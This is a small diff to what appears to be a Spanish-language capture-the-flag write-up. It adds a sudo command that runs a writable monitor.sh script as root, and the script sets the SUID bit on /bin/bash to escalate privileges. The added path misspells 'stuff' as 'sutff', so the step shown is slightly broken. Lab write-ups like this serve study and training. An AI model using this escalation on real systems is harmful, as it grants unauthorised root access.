@@ -57,6 +57,8 @@ Esto quiere decir que podemos ejecutar como root y sin password monitor.sh
 mkdir -p personal/stuff
 touch monitor.sh
 
+sudo -u root /home/nibble/personal/sutff/monitor.sh
+
 #!/bin/bash
 
 chmod u+s /bin/bash
